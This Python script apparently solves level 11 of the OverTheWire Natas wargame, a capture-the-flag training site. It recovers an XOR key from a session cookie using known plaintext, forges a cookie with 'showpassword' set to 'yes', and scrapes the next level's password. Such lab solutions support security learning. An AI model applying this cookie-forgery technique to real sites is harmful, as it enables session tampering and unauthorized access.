import re
import requests
from halo import Halo
from urllib.parse import unquote
import base64


def get_xor_key(cookie):
    cookie = unquote(cookie)  # Url decode
    cookie = base64.b64decode(cookie).decode()
    default_json = '{"showpassword":"no","bgcolor":"#ffffff"}'
    xor_key = ""
    for i, x in zip(cookie, default_json):
        """
        XOR decoded cookie with default json to get secret key
        """
        xor_key += chr(ord(i) ^ ord(x))

    return xor_key


def get_valid_cookie(key):
    key = key[:4]
    new_json = '{"showpassword":"yes","bgcolor":"#ffffff"}'
    cookie = ""
    for i, d in enumerate(new_json):
        """
        XOR new json with secret key to get valid cookie 
        to display password for natas 12
        """
        cookie += chr(ord(d) ^ ord(key[i % len(key)]))
    cookie = bytes(cookie, 'utf-8')
    cookie = base64.b64encode(cookie).decode()

    return cookie


def get_natas12_password(natas11_password):
    URL = "http://natas11.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 12 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas11", natas11_password)
    session.get(URL)
    cookie = session.cookies.get_dict()['data']
    key = get_xor_key(cookie)
    valid_cookie = get_valid_cookie(key)
    for cookie in session.cookies:
        if cookie.name == 'data':
            cookie.value = valid_cookie
    response = session.get(URL)
    natas12_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[1]

    spinner.succeed(text="The password for natas 12 is: " + natas12_password)

    return natas12_password


if __name__ == '__main__':
    natas11_password = ""  # Put here the password for natas11 here
    get_natas12_password(natas11_password)
